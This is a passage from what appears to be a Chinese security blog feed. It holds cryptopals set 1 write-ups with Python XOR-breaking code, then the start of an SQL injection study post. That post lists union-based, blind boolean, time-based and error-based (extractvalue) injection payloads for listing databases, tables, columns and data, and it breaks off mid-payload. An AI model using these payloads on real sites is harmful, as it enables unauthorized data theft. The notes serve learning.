class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">CHARACTER_FREQ = &#123;  <span class="comment"># 字符频率表, 出现一次某字母的得分</span></span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="number">0.0651738</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">0.0124248</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">0.0217339</span>, <span class="string">&#x27;d&#x27;</span>: <span class="number">0.0349835</span>, <span class="string">&#x27;e&#x27;</span>: <span class="number">0.1041442</span>, <span class="string">&#x27;f&#x27;</span>: <span class="number">0.0197881</span>, <span class="string">&#x27;g&#x27;</span>: <span class="number">0.0158610</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>: <span class="number">0.0492888</span>, <span class="string">&#x27;i&#x27;</span>: <span class="number">0.0558094</span>, <span class="string">&#x27;j&#x27;</span>: <span class="number">0.0009033</span>, <span class="string">&#x27;k&#x27;</span>: <span class="number">0.0050529</span>, <span class="string">&#x27;l&#x27;</span>: <span class="number">0.0331490</span>, <span class="string">&#x27;m&#x27;</span>: <span class="number">0.0202124</span>, <span class="string">&#x27;n&#x27;</span>: <span class="number">0.0564513</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>: <span class="number">0.0596302</span>, <span class="string">&#x27;p&#x27;</span>: <span class="number">0.0137645</span>, <span class="string">&#x27;q&#x27;</span>: <span class="number">0.0008606</span>, <span class="string">&#x27;r&#x27;</span>: <span class="number">0.0497563</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">0.0515760</span>, <span class="string">&#x27;t&#x27;</span>: <span class="number">0.0729357</span>, <span class="string">&#x27;u&#x27;</span>: <span class="number">0.0225134</span>,</span><br><span class="line">    <span class="string">&#x27;v&#x27;</span>: <span class="number">0.0082903</span>, <span class="string">&#x27;w&#x27;</span>: <span class="number">0.0171272</span>, <span class="string">&#x27;x&#x27;</span>: <span class="number">0.0013692</span>, <span class="string">&#x27;y&#x27;</span>: <span class="number">0.0145984</span>, <span class="string">&#x27;z&#x27;</span>: <span class="number">0.0007836</span>, <span class="string">&#x27; &#x27;</span>: <span class="number">0.1918182</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Set1.Fixed_XOR <span class="keyword">import</span> fixed_xor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex2text</span>(<span class="params">Hex</span>):</span></span><br><span class="line">    h = Hex</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(h) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        t = <span class="string">&#x27;0&#x27;</span> + h</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(b, <span class="number">16</span>)) <span class="keyword">for</span> b <span class="keyword">in</span> [h[i:i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(h), <span class="number">2</span>)]])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>(<span class="params">LEN</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>): <span class="keyword">yield</span> ((<span class="number">2</span> - <span class="built_in">len</span>(<span class="built_in">hex</span>(i)[<span class="number">2</span>:])) * <span class="string">&#x27;0&#x27;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:]) * (LEN // <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getscore</span>(<span class="params">text</span>):</span></span><br><span class="line">    score = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">        i = i.lower()</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> CHARACTER_FREQ:</span><br><span class="line">            score += CHARACTER_FREQ[i]</span><br><span class="line">    <span class="keyword">return</span> score</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">cipher</span>):</span></span><br><span class="line">    generator = keygen(<span class="built_in">len</span>(cipher))</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> generator:</span><br><span class="line">        plain = hex2text(fixed_xor(cipher, i))</span><br><span class="line">        score = getscore(plain)</span><br><span class="line">        res.append([plain, score, i])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    cipher = <span class="string">&#x27;1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736&#x27;</span></span><br><span class="line">    <span class="built_in">max</span> = [<span class="number">0</span>, -<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> attack(cipher):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">max</span>[<span class="number">1</span>] &lt; i[<span class="number">1</span>]:</span><br><span class="line">            <span class="built_in">max</span> = i</span><br><span class="line">    print(<span class="built_in">max</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>关于最后面的排序, 看了相关文章发现其实可以用<code>sorted()</code>函数</p><p>直接举例子, 简单易懂</p><ol><li>对键排序<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dict1=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;e&#x27;</span>:<span class="number">3</span>,<span class="string">&#x27;f&#x27;</span>:<span class="number">8</span>,<span class="string">&#x27;d&#x27;</span>:<span class="number">4</span>&#125;</span><br><span class="line">list1= <span class="built_in">sorted</span>(dict1.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">0</span>])</span><br><span class="line">print(list1)</span><br></pre></td></tr></table></figure></li><li>对值排序<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dict1=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;e&#x27;</span>:<span class="number">3</span>,<span class="string">&#x27;f&#x27;</span>:<span class="number">8</span>,<span class="string">&#x27;d&#x27;</span>:<span class="number">4</span>&#125;</span><br><span class="line">list1= <span class="built_in">sorted</span>(dict1.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line">print(list1)</span><br></pre></td></tr></table></figure>借用大佬的代码, 其实attack函数可以写成<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">cipher</span>):</span> </span><br><span class="line">    generator = keygen(<span class="built_in">len</span>(cipher))</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> generator:</span><br><span class="line">        plain = hex2text(fixed_xor(cipher, i))</span><br><span class="line">        score = getscore(plain)</span><br><span class="line">        res.append(&#123;<span class="string">&#x27;key&#x27;</span>: key, <span class="string">&#x27;plaintext&#x27;</span>: plaintext, <span class="string">&#x27;score&#x27;</span>: score&#125;)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(res, key = <span class="keyword">lambda</span> c:c[<span class="string">&#x27;score&#x27;</span>])</span><br></pre></td></tr></table></figure><a name='4'></a></li></ol><h1 id="cryptopals-1-4-Detect-single-character-XOR"><a href="#cryptopals-1-4-Detect-single-character-XOR" class="headerlink" title="cryptopals 1.4 - Detect single-character XOR"></a>cryptopals 1.4 - Detect single-character XOR</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p> One of the 60-character strings in <a href="https://cryptopals.com/static/challenge-data/4.txt">this file</a> has been encrypted by single-character XOR.</p><p>Find it.</p><p>(Your code from #3 should help.) </p><p>意思是说, 在那个文件里面的60个字符串里面, 有一个是被xor加密过后的(一开始读题还以为是60个都是被加密的), 让我们找到他并且解密出来.</p><p>其实跟1.3没什么区别, 只是从1组里面选得分最高的密钥变成先根据密钥选出1组里面最高分的, 再选出60个字符串里面最高分的那组.</p><h2 id="脚本-3"><a href="#脚本-3" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Single_byte_XOR_cipher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    cipher = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;4.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            cipher = f.readline()[:-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> cipher == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            res.append(attack(cipher)[-<span class="number">1</span>])</span><br><span class="line">    print(<span class="built_in">sorted</span>(res, key=<span class="keyword">lambda</span> x: x[<span class="string">&#x27;score&#x27;</span>])[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name='5'></a></p><h1 id="cryptopals-1-5-Implement-repeating-key-XOR"><a href="#cryptopals-1-5-Implement-repeating-key-XOR" class="headerlink" title="cryptopals 1.5 - Implement repeating-key XOR"></a>cryptopals 1.5 - Implement repeating-key XOR</h1><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><p> Here is the opening stanza of an important work of the English language:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Burning &#39;em, if you ain&#39;t quick and nimble</span><br><span class="line">I go crazy when I hear a cymbal</span><br></pre></td></tr></table></figure><p>Encrypt it, under the key “ICE”, using repeating-key XOR.</p><p>In repeating-key XOR, you’ll sequentially apply each byte of the key; the first byte of plaintext will be XOR’d against I, the next C, the next E, then I again for the 4th byte, and so on.</p><p>It should come out to:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0b3637272a2b2e63622c2e69692a23693a2a3c6324202d623d63343c2a26226324272765272</span><br><span class="line">a282b2f20430a652e2c652a3124333a653e2b2027630c692b20283165286326302e27282f</span><br></pre></td></tr></table></figure><p>Encrypt a bunch of stuff using your repeating-key XOR function. Encrypt your mail. Encrypt your password file. Your .sig file. Get a feel for it. I promise, we aren’t wasting your time with this. </p><p>题目升级了!!!</p><h2 id="脚本-4"><a href="#脚本-4" class="headerlink" title="脚本"></a>脚本</h2><p>写完脚本才发现他是要我加密, 而不是解密, 所以只好再写一个加密的了</p><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Fixed_XOR <span class="keyword">import</span> fixed_xor</span><br><span class="line"><span class="keyword">from</span> Single_byte_XOR_cipher <span class="keyword">import</span> hex2text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keypadding</span>(<span class="params">ciplen, key</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([key[i % <span class="built_in">len</span>(key)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ciplen)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">text2hex</span>(<span class="params">text</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    cipher = <span class="string">&#x27;0b3637272a2b2e63622c2e69692a23693a2a3c6324202d623d63343c2a26226324272765272\na282b2f20430a652e2c652a3124333a653e2b2027630c692b20283165286326302e27282f&#x27;</span></span><br><span class="line">    key = <span class="string">&#x27;ICE&#x27;</span></span><br><span class="line">    cipher = <span class="string">&#x27;&#x27;</span>.join(cipher.split(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    padkey = text2hex(keypadding(<span class="built_in">len</span>(cipher), key))</span><br><span class="line">    res = hex2text(fixed_xor(cipher, padkey))</span><br><span class="line">    print(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Fixed_XOR <span class="keyword">import</span> fixed_xor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keypadding</span>(<span class="params">ciplen, key</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([key[i % <span class="built_in">len</span>(key)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ciplen)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">text2hex</span>(<span class="params">text</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    plain = <span class="string">&quot;Burning &#x27;em, if you ain&#x27;t quick and nimble I go crazy when I hear a cymbal&quot;</span></span><br><span class="line">    key = <span class="string">&#x27;ICE&#x27;</span></span><br><span class="line">    padkey = keypadding(<span class="built_in">len</span>(plain), key)</span><br><span class="line">    hexplain = text2hex(plain)</span><br><span class="line">    hexpadkey = text2hex(padkey)</span><br><span class="line">    print(fixed_xor(hexplain, hexpadkey))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name='6'></a></p><h1 id="cryptopals-1-6-Break-repeating-key-XOR"><a href="#cryptopals-1-6-Break-repeating-key-XOR" class="headerlink" title="cryptopals 1.6 - Break repeating-key XOR"></a>cryptopals 1.6 - Break repeating-key XOR</h1><h2 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h2><p> There’s a <a href="https://cryptopals.com/static/challenge-data/6.txt">file here</a>. It’s been base64’d after being encrypted with repeating-key XOR.</p><p>Decrypt it.</p><p>Here’s how:</p><ol><li>Let KEYSIZE be the guessed length of the key; try values from 2 to (say) 40.</li><li>Write a function to compute the edit distance/Hamming distance between two strings. <em>The Hamming distance is just the number of differing bits.</em> The distance between:<br><code>this is a test</code> and  <code>wokka wokka!!!</code> is 37. Make sure your code agrees before you proceed.</li><li>For each KEYSIZE, take the first KEYSIZE worth of bytes, and the second KEYSIZE worth of bytes, and find the edit distance between them. Normalize this result by dividing by KEYSIZE.</li><li>The KEYSIZE with the smallest normalized edit distance is probably the key. You could proceed perhaps with the smallest 2-3 KEYSIZE values. Or take 4 KEYSIZE blocks instead of 2 and average the distances.</li><li>Now that you probably know the KEYSIZE: break the ciphertext into blocks of KEYSIZE length.</li><li>Now transpose the blocks: make a block that is the first byte of every block, and a block that is the second byte of every block, and so on.</li><li>Solve each block as if it was single-character XOR. You already have code to do this.</li><li>For each block, the single-byte XOR key that produces the best looking histogram is the repeating-key XOR key byte for that block. Put them together and you have the key.</li></ol><p>This code is going to turn out to be surprisingly useful later on. Breaking repeating-key XOR (“Vigenere”) statistically is obviously an academic exercise, a “Crypto 101” thing. But more people “know how” to break it than can actually break it, and a similar technique breaks something much more important.<br><a name='7'></a></p><h1 id="cryptopals-1-7-AES-in-ECB-mode"><a href="#cryptopals-1-7-AES-in-ECB-mode" class="headerlink" title="cryptopals 1.7 - AES in ECB mode"></a>cryptopals 1.7 - AES in ECB mode</h1><h2 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h2><p> The Base64-encoded content <a href="https://cryptopals.com/static/challenge-data/7.txt">in this file</a> has been encrypted via AES-128 in ECB mode under the key</p><pre><code>&quot;YELLOW SUBMARINE&quot;.</code></pre><p>(case-sensitive, without the quotes; exactly 16 characters; I like “YELLOW SUBMARINE” because it’s exactly 16 bytes long, and now you do too).</p><p>Decrypt it. You know the key, after all.</p><p>Easiest way: use OpenSSL::Cipher and give it AES-128-ECB as the cipher. </p><p>You can obviously decrypt this using the OpenSSL command-line tool, but we’re having you get ECB working in code for a reason. You’ll need it a lot later on, and not just for attacking ECB. </p><blockquote><p>未完待续…<br><a name='8'></a></p></blockquote><h1 id="cryptopals-1-8-Detect-AES-in-ECB-mode"><a href="#cryptopals-1-8-Detect-AES-in-ECB-mode" class="headerlink" title="cryptopals 1.8 - Detect AES in ECB mode"></a>cryptopals 1.8 - Detect AES in ECB mode</h1><h2 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h2><p>In <a href="https://cryptopals.com/static/challenge-data/8.txt">this file</a> are a bunch of hex-encoded ciphertexts.</p><p>One of them has been encrypted with ECB.</p><p>Detect it.</p><p>Remember that the problem with ECB is that it is stateless and deterministic; the same 16 byte plaintext block will always produce the same 16 byte ciphertext.</p><blockquote><p>未完待续…</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;开始学习cryptopals啦, 一题一题的做完它吧(也不知道能做多久…&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;目录&quot;&gt;&lt;a href=&quot;#目录&quot; class=&quot;headerlink&quot; title=&quot;目录&quot;&gt;&lt;/a&gt;目录&lt;/h1&gt;&lt;u</summary>
      
    
    
    
    <category term="CryptoSummary" scheme="http://tearsjin.github.io/categories/CryptoSummary/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="cryptopals" scheme="http://tearsjin.github.io/tags/cryptopals/"/>
    
  </entry>
  
  <entry>
    <title>Experience summary of SQL injection</title>
    <link href="http://tearsjin.github.io/2020/09/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%8F%E9%AA%8C%E5%A4%A7%E6%9D%82%E7%83%A9/"/>
    <id>http://tearsjin.github.io/2020/09/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%8F%E9%AA%8C%E5%A4%A7%E6%9D%82%E7%83%A9/</id>
    <published>2020-09-29T09:16:53.000Z</published>
    <updated>2021-03-13T03:03:56.164Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一般注入"><a href="#一般注入" class="headerlink" title="一般注入"></a>一般注入</h2><p>通过修改参数的值, 例如<strong>正常数字 大数字 字符 单引号 双引号 括号 反斜杠等等</strong>来探测是否存在注入点. 如果有报错信息, 则可以根据报错信息还原SQL语句.</p><blockquote><p>例如在数字后面加 ‘ 不行则可以试试加 \</p></blockquote><h3 id="注入操作-找到注入点并还原SQL语句后"><a href="#注入操作-找到注入点并还原SQL语句后" class="headerlink" title="注入操作(找到注入点并还原SQL语句后)"></a>注入操作(找到注入点并还原SQL语句后)</h3><ol><li>利用<code>order by</code>来判断字段数(联合查询需要相同的字段)</li><li>得到字段数后, 判断显位. 例如<code>url?id=-1&#39; union select 1,2,3</code>, 观察哪个数字会显示出来.</li><li>获取数据库名(显位是2的情况下,下面也是)</li></ol><ul><li><code>union select 1,database(),3</code></li><li><code>select 1 , group_concat(schema_name) , 3 from information_schema.schemata</code></li></ul><ol start="4"><li>列出数据库中所有表(假设库名是test)</li></ol><ul><li><code>select group_concat(table_name) from information_schema.tables where table_schema = test</code> 如果不行 可以试试<code>&#39;test&#39;</code> <code>0x674657374</code>(把test转成十六进制) <code>database()</code></li></ul><ol start="5"><li>列出所有字段</li></ol><ul><li>select group_concat(column_name) from information_schema,columns where table_name = </li></ul><ol start="6"><li>爆数据就完事了</li></ol><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>跟一般注入的区别在于, 服务端不再返回报错内容, 注入的时候只能知道自己输入的语句是否出错, 而且也不能直接得到库名表名这些. 盲注一般分为两种, 一种是基于布尔的, 一种是基于时间的.</p><h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p>使用盲注得知道一些函数: </p><ul><li>ascii(str): str是一个字符串参数，返回值为其最左侧字符的ascii码。通过它，我们才能确定特定的字符。</li><li>substr(str,start,len): 这个函数是取str中从下标start开始的，长度为len的字符串。通常在盲注中用于取出单个字符，交给ascii函数来确定其具体的值。</li><li>length(str): 这个函数是用来获取str的长度的。这样我们才能知道需要通过substr取到哪个下标。</li><li>count([column]): 统计记录的数量，其在盲注中，主要用于判断符合条件的记录的数量，并逐个破解。</li><li>if(condition,a,b): 当condition为true的时候，返回a，当condition为false的时候，返回b。</li><li>sleep(n): 服务端等待n秒后返回记录, 在时间盲注中, 用于判断语句是否正确.</li><li>benchmark(times, func): 执行times次func, 也用于时间盲注, 通过服务端的反应时间来判断语句是否正确.</li></ul><h3 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h3><p>基于布尔的盲注是根据页面差来进行判断注入和数据注入的。在存在注入的页面输入and (true)则返回页面1；输入and (false)则返回页面2，而页面1和页面2有差别，常见的情况页面1是正常页面，页面2是错误页面</p><h4 id="注入操作"><a href="#注入操作" class="headerlink" title="注入操作"></a>注入操作</h4><ol><li>获取用户名<ol><li>猜用户名的长度<br><code>and(select length(user()))=数字</code>, 不断尝试不同的数字得到用户名的长度</li><li>逐位猜解用户名<br><code> and (select ascii(mid(user(),位数,1)))=114</code>, 猜测在某个位置的字母的ASCII码为114. 通过观察返回的页面来判断每一位的字母, 最终得到用户名</li></ol></li><li>获取当前数据库的库名<ol><li>猜库名长度<br><code>and (select length(database()))=数字</code></li><li>逐位猜解库名<br><code>and (select ascii(mid(database(),位数,1)))=116</code></li></ol></li><li>获取表名<ol><li>判断表的数量<br><code>and (select count(table_name) from information_schema.tables where table_schema=database())=4</code>,这条语句就是判断数据库中有4张表</li><li>判断表名的长度<br><code>and (select length(table_name) from information_schema.tables where table_schema=database() limit 位数,1)=5</code>, 位数指的是第几张表</li><li>逐位拆解表名<br><code>and (select ascii(mid(table_name,表名的第几位,1)) from information_schema.tables wheretable_schema=database() limit 第几张表,1)=100</code></li></ol></li><li>获取列名<ol><li>判断列的数量<br><code>and (select count(column_name) form information_schema.columns where table_schema=表名)=数字</code></li><li>判断列的长度<br><code>and (select length(column_name) form information_schema.columns where table_schema=表名 limit 第几列,1)=数字</code></li><li>逐位猜解列名<br><code>and (select ascii(mid(column_name,第几个字母,1)) form information_schema.columns where table_schema=表名 limit 第几列,1)=数字</code></li></ol></li><li>获取数据<ol><li>判断数据的条数<br><code>and (select conut(列名) from 表名)=数字</code></li><li>判断数据的长度<br><code>and (select length(列名) from 表名 limit 第几条,1)=数字</code></li><li>逐位猜解数据<br><code>and (select ascii(mid(列名,第几个字母,1)) from 表名 limit 第几条,1)=数字</code></li></ol></li></ol><p><strong>事实上,以上语句中的’=’都可以用’&lt;’和’&gt;’来代替以便于更快的确定数据</strong>, 而且手工注入往往需要大量的尝试, 这非常的<del>操蛋</del>繁琐, 一般可以写脚本来注入</p><h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>利用<code>sleep()</code>或<code>benchmark()</code>等函数让mysql执行时间变长经常与<code>if(expr1,expr2,expr3)</code>语句结合使用, 通过页面的响应时间来判断条件是否正确. <code>if(expr1,expr2,expr3)</code>含义是如果<code>expr1</code>是<code>True</code>, 则返回<code>expr2</code>, 否则返回<code>expr3</code>.</p><h4 id="注入操作-1"><a href="#注入操作-1" class="headerlink" title="注入操作"></a>注入操作</h4><p><del>反正也不会真的去手工注入</del><strong>sqlmap即可</strong></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>报错注入有很多很多(至少我在网上查找资料的时候看见了很多), 一边做题, 一边把遇到的报错注入的方法进行总结吧.<br><strong>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中</strong></p><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul><li>通过<code>extractvalue()</code>或<code>updatexml()</code>函数</li></ul><h3 id="通过extractvalue-或updatexml-函数"><a href="#通过extractvalue-或updatexml-函数" class="headerlink" title="通过extractvalue()或updatexml()函数"></a>通过<code>extractvalue()</code>或<code>updatexml()</code>函数</h3><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><ol><li>当union被过滤的时候</li></ol><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><code>extractvalue()</code> :对XML文档进行查询的函数<br><code>udatexml()</code> :对XML文档进行更新的函数<br>语法：</p><ul><li><code>extractvalue(文档，路径)</code></li><li><code>updatexml(目标xml文档，xml路径，更新的内容)</code></li><li><em>路径写入其他格式，就会报错并且会返回我们写入的非法格式内容，我们可以利用这个得到我们想得到的内容</em>*</li></ul><h4 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查数据库名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select database()))))</span><br><span class="line">爆表名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))))</span><br><span class="line">爆字段名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot;))))</span><br><span class="line">爆数据：id&#x3D;&#39;and(select 